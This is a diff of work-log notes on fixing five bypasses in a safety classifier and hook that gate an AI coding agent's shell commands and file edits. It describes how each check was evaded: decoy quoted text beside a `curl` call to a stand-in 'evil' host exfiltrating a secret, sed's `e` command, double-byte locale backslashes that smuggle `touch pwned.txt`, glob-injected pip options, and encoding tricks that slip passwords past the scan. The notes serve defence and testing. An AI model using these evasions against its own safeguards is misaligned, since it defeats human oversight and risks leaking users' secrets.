@@ -3744,3 +3744,241 @@ entries). No version changes.
   1 MB string (0.22 s, not read for paths). No CLI or nested agent was
   started; nothing was left running; the scratch repositories and inputs
   were removed.
+
+### Batch 2: five reported defects
+
+Five defects, each reproduced by an independent verifier on 6004f78 and
+reproduced again here on 3ecf6aa (batch 1's commit) before any change: four
+in the SDK's Bash classifier and one in the persist skill's command hook.
+None was fixed by an earlier batch (git log and rounds 1 to 3 checked; batch
+1's tests pass unchanged but for three expectations made stricter, below).
+Each fix has tests that fail on the code before it: the 119 tests of
+`tests/test_bash_program_words.py` run with 3ecf6aa's mapper put back (a
+stand-in `git_change_may_run` added so the module imports) gave 82
+failures, and the new persist tests with 3ecf6aa's `skills/persist/SKILL.md`
+gave 14; what passed is the fixtures' own checks (GNU sed's `e` runs a
+command, `docker rm` asks the daemon `DOCKER_HOST` names, `git reset`
+fetches in a partial clone, the hooks a change runs, bash runs two commands
+in GBK and BIG5, `pip show *` writes the log a file name names), the
+controls and the plugin hook's agreement.
+
+#### 1. Text in an argument narrowed the class: a decoy dropped `send`, so a destination policy was skipped (high)
+
+`_classify_single_command` matched its patterns against the words joined by
+blanks, quoted arguments included, and the first match set the class.
+`_DESTRUCTIVE_PATTERNS` was anchored only in its first alternative, so
+`curl -s https://evil/c?k=SECRET -A 'git reset'`, `wget ... --header 'X:
+sed -i'`, `bash -c 'curl ...' x 'git clean'` and `node exfil.js 'docker rm'`
+were `mutate` alone: with approvals off and a destination policy in force
+they ran (the adapter checks a Bash call against the policy only when its
+class holds `send`), and with approvals on they were put to a person as
+`mutate` instead of refused (F504). Its `\|\s*(rm|tee|dd)\s` alternative
+could match only quoted text (unquoted pipes split the line). The same held
+for the interpreter pattern (`rm -rf x 'python3 -c '` was `execute` and
+`send`, without `mutate`) and the network pattern (`rm -rf x 'ssh h'` was
+`send` alone).
+
+- Fix (mapper): a class narrower than the worst case comes only from the
+  command's program, its first word as the shell passes it: the local file
+  programs by word (`rm`, `rmdir`, `mv`, `chmod`, `chown`, `ln`, `unlink`,
+  `shred`, with an argument; a quoted `'rm -rf'` or `RM` is no longer one),
+  the local git changes by word (`_local_git_change`: `git reset`, `git
+  checkout --`, `git clean`, `git branch -d|-D`, every `git stash` form), and
+  the network and remote-mutation patterns matched from the start of the
+  words (`re.match`, case-sensitive). The interpreter pattern still matches
+  anywhere (a program that runs another, `env` or `xargs`, may run it), and
+  `_worst_case(capability)` now always holds `mutate` and `send` with
+  `capability` first, so a match can only add `execute`. A program that
+  sends is `send` and `mutate` (`curl -o`, `scp` and `rsync` write local
+  files): no pattern result lacks a capability the worst case has, but the
+  local mutations the program itself names. `cp` is no longer read as a
+  local mutation: its alternative (`cp\s+.*\s+/` followed by a blank)
+  matched only a word that is `/` alone, so it already took the worst case.
+- Consequence: a read-only command whose argument holds such text (`grep
+  'git reset' f`, `git log --grep='docker rm'`) now observes (it was gated:
+  the argument set the class), and an interpreter found anywhere is
+  `execute`, `mutate`, `send`, so a profile's rule for `mutate` applies to it.
+- Tests: `TestArgumentText` (ten decoys keep the worst case; every base
+  program × 14 texts × 2 quotings keeps every capability it has alone; the
+  program gives the class; a quoted or upper-case program name is no
+  program; F504 under a policy with approvals `ask` and `off`; the plugin
+  hook gates them), the reported lines added to
+  `test_a_command_that_may_send_is_f504_under_a_policy`, and a 4096-byte
+  line of decoys classified in bounded time.
+
+#### 2. `sed -i`, `docker rm|rmi|prune` and the git changes where git fetches or runs a hook were local `mutate` (medium)
+
+`sed -i` runs a command through GNU sed's `e` command or `s///e` flag
+(verified: both wrote their sentinel); `docker rm|rmi|prune` sends its
+request to the daemon `DOCKER_HOST` or the docker context names (verified:
+a listener on `DOCKER_HOST` logged `DELETE /v1.xx/containers/<name>`); in a
+partial clone `git reset --hard HEAD~1` and `git reset HEAD~1` fetched the
+objects they lacked (verified: missing objects went from 1 to 0), and `git
+stash apply <a commit not in the clone>` fetched. Each was `mutate` alone.
+
+- Fix (mapper): `sed` (`-i` or not) and `docker rm|rmi|prune` are on no
+  list: the worst case, as `sed` and the other docker commands already
+  were. A local git change takes the worst case where `_git_change_gated`
+  holds: what `_git_read_gated` asks (a git directory that may be content, a
+  program the configuration names, a partial clone or submodules) or a hook
+  git runs on such a change (`git_change_may_run`: `post-index-change`,
+  `reference-transaction`, `post-checkout`; found by running every hook git
+  documents on each form: `git reset` and `git stash` run
+  `post-index-change` and `reference-transaction`, `git branch -d` and `git
+  stash drop` `reference-transaction`, `git checkout --` `post-checkout` and
+  `post-index-change`, `git clean` none; git-lfs installs a `post-checkout`
+  that fetches). `git_config_may_run` and `git_change_may_run` share one
+  lookup (`_repository_runs`) and differ in the hooks they look for.
+- Sibling (fixed): batch 1 made a recorded restore a gated `mutate` where
+  the configuration names a program (a smudge filter, a merge driver); that
+  program may send anywhere, so the restore now takes the worst case, as
+  the reads there do (it is the hook's gated `mutate` there too: the hook
+  applies no destination policy).
+- Kept: `git stash create` and the restore of a recorded checkpoint keep
+  their classes in a partial clone (a probe fetched nothing for either; a
+  recorded restore ran only `post-index-change`, which
+  `git_config_may_run` already counts).
+- Tests: `TestLocalChangesThatReachFurther` (the fixtures above; ten sed and
+  docker forms take the worst case; nine git changes in a partial clone take
+  it and stay `mutate` in a plain repository; three hook fixtures run their
+  hook and take it; a `pre-commit` hook gates nothing; a failed lookup is a
+  yes; F504 under a policy). Batch 1's expectations made stricter:
+  `git stash create` there is `checkpoint, execute, mutate, send`, a
+  recorded restore there `mutate, send`, and `python3 -c` and `curl -X POST
+  ... -d` gained `mutate`.
+
+#### 3. A backslash after some UTF-8 characters is half a character in a double-byte locale (medium)
+
+The mapper reads the command as Unicode text; bash reads its bytes in the
+user's locale. In GBK, GB18030, BIG5 or Shift JIS, the last byte of some
+characters' UTF-8 form is a first byte whose second byte may be 0x5C, the
+backslash: `ls ぁ\;touch pwned.txt` is one `ls` to the mapper and `ls ぁ\`
+then `touch pwned.txt` to bash (verified with locales built by `localedef`:
+GBK and BIG5 created the file, `C` did not; the double-quoted form `ls
+"ぁ\";touch pwned_dq #"` too). The adapter allowed it as `observe`.
+
+- Fix (mapper `_simple_commands`): a line with a backslash right after a
+  character outside ASCII cannot be read (the worst case), wherever it is.
+  Why that suffices: a second byte is 0x40 or above (0x30 to 0x39 in a
+  GB18030 four-byte form), so the only byte bash can take from the line is
+  one of `@`, letters, digits, `[ \ ] ^ _ { | } ~` and the backtick; every
+  one of them but the backslash only takes an operator, a glob or a quote
+  from bash, which then runs fewer commands than the mapper read; only a
+  backslash bash does not see makes the next character active. A backslash
+  after an ASCII character is not affected (a second byte follows a first
+  byte of 0x81 or above, and no ASCII character is one).
+- The plugin hook already refuses any `\` (a test keeps it so for these
+  lines).
+- Tests: `TestDoubleByteLocales` (bash in GBK and BIG5 runs the second
+  command, in `C` it does not; six lines take the worst case; five lines
+  with such characters but no backslash right after one still observe;
+  F501 without a checkpoint, F504 under a policy; the plugin hook's F501).
+
+#### 4. `pip` was missing from `_ARGUMENT_WRITERS` (medium)
+
+Round 2 put `pip list` and `pip show` on the allow-list, read-only with the
+options `_SUBCOMMAND_OPTIONS` lists, but a word the shell expands was read as
+the literal `*`: `pip show *` in a directory holding a file named
+`--log=pwned-by-glob.log` wrote that log (verified with pip 24.0), and
+`--proxy=...` in a file name makes pip ask that host.
+
+- Fix (mapper): `pip` joins `_ARGUMENT_WRITERS`; every command whose
+  options `_writes` reads is now there (checked: the allow-list's other
+  commands, `ls`, `cat`, `grep`, `wc` and the rest, have no option that
+  writes, runs or sends). The plugin hook does not list `pip`.
+- Tests: `TestPipGlobs` (five glob forms take the worst case; `pip show *`
+  writes the log a file name names; the plugin hook gates it), and `pip show
+  *` and `pip list *` added to
+  `test_arguments_the_classifier_does_not_take_as_read_only`.
+
+#### 5. The persist hook worked out the file after an Edit differently from Claude Code (medium)
+
+The hook read the target's raw bytes and applied old_string/new_string with
+its own rules; Claude Code 2.1.330 (read in its binary, not run) reads a file
+opening with FF FE as UTF-16LE, turns CRLF into LF before matching, removes
+`old_string` with the line break after it when `new_string` is empty
+(`bos`/`Uur`), and finds a non-ASCII `old_string` as the file's `\uXXXX`
+escapes (and an escape in `old_string` as the character), escaping
+`new_string` to match (`Vrt`, `de`). Where the hook found no `old_string` it
+scanned only the carried text: a CRLF file with an `old_string` spanning a
+line break, a UTF-16LE file, two Edits whose second deletes `DELETE-ME` and
+so joins `password: "` to its value, and a JSON file whose `café` is
+`café` each stored a password the scan recognises.
+
+- Fix (`skills/persist/SKILL.md`): the file is read as Claude Code reads it
+  (FF FE: converted with `iconv`, refused R407 without it; CRLF read as LF);
+  each edit is applied as Claude Code applies it (as written, else with
+  curly quotes read as straight ones; the empty-`new_string` rule; first or
+  all occurrences); an `old_string` an existing file holds in neither form
+  is refused (R407, a message of its own, by jq's `halt_error(3)`): Claude
+  Code may still find it through an escape, and the hook cannot tell what
+  the file will hold. A file that does not exist is read as empty, as
+  before (Claude Code fails such an Edit).
+- Sibling (fixed, time): every `join` in the hook's jq is now `joined`, which
+  is linear (`add` over the pieces): jq 1.7's `join` copies what it has
+  built at each piece, so reading a 1 MB file of CRLF lines as LF took
+  3.4 s and a 4 MB one about a minute, past the hook's 30 s limit (which
+  blocks the call), and a 1.4 MB Write of 32,000 new lines took 2.2 s (now
+  0.7 s).
+- Not changed: the audit skill's Edit hook refuses any edit of the records
+  file whatever it holds; the SDK adapter and the binding apply no file
+  edit (their `persist` checks read the call's data).
+- Tests: `test_reads_the_file_as_claude_code_edits_it` (CRLF, UTF-16LE, the
+  two-call empty-`new_string` sequence, the file written between calls as
+  Claude Code would), `test_refuses_an_old_string_it_does_not_find` (an
+  escape in the file, an escape in `old_string`, an absent `old_string`,
+  each as Edit and MultiEdit; the absent case moved here from the allow
+  test, where it was allowed), `test_a_utf16_file_needs_iconv`,
+  `test_a_file_that_is_not_there_is_read_as_empty`, a control for the
+  empty-`new_string` rule, two allow cases (a CRLF and a UTF-16LE edit
+  that adds no credential) and a bounded-time test (a 4 MB CRLF file and
+  Write, each under 15 s), in sh and bash.
+
+#### Siblings checked
+
+- Batch 1 and rounds 1 and 2 hold: their tests pass (three expectations
+  stricter, above); the quoted-operator reading, the 4096-byte bound (a
+  4096-byte decoy line classifies in bounded time), `printf -v`, the
+  partial-clone and configured-program reads.
+- Other narrowing classes: `observe` (the allow-list, `_writes`) and the
+  `git stash` line-of-one classes read words, not joined text; the remote-
+  mutation pattern gave the worst case anyway and is now anchored too.
+- The TypeScript package and the binding classify no shell command and edit
+  no file; the plugin hook gates every line above as `mutate` (it applies no
+  destination policy) and refuses any backslash.
+
+#### Documentation
+
+SECURITY.md (§5.4's persist row; §5.5's paragraph on the adapter's Bash
+classifier), `docs/integrations/claude_agent_sdk.md` (the Bash
+classification text and table: classes from the program only, `sed -i`,
+`docker rm`, the local git changes and `git_change_may_run`, `execute,
+mutate, send` and `send, mutate`, the backslash rule, `pip` globs), the
+mapper's comments and docstrings, the persist hook's comment, and
+CHANGELOG [Unreleased] Upgrading (the SDK's Bash entry; the plugin's
+persist entry). No version changes.
+
+#### Checks after batch 2
+
+- Python: `pytest tests/` (6354 passed, 18 skipped), and again the eight
+  affected files after the last hook edit (2033 passed); ruff check and
+  format with CI's lists; mypy; every `tools/validate_*.py` of CLAUDE.md,
+  `validate_workflows.py --strict` and every domain catalog and example
+  `--strict`; `sync_skill_schemas.py --check` and the generators' `--check`
+  (no fixture or vector changed); `scripts/run_conformance.py`.
+- Rust: no Rust source changed, so `cargo test` was not rerun and no core
+  was rebuilt.
+- TypeScript: `packages/acs-core` build, check and test (2007); the
+  binding's check and test (235 passed, 2 skipped). No TypeScript source
+  changed: neither classifies shell commands nor edits files.
+- Site: `npm run check`, `npm test` (1173).
+- Old code: the new mapper tests with 3ecf6aa's mapper (82 of 119 failed)
+  and the new persist tests with 3ecf6aa's hook (14 failed), above.
+- Probes, each under `timeout 120` and a 4 GB address-space limit, inputs of
+  at most 1.5 MB: every reported line through `map_tool` before and after
+  (all now the worst case or stricter); the persist hook on 1 MB of CRLF
+  lines (3.5 s with jq's join, 0.4 s with the linear one, linear from 256
+  KB to 1 MB) and a 1.4 MB Write (2.2 s before, 0.7 s after). No CLI or nested
+  agent was started (Claude Code's edit functions were read in its binary
+  with `grep`); the docker listener and every other process were stopped;
+  the scratch repositories, locales and inputs were removed.
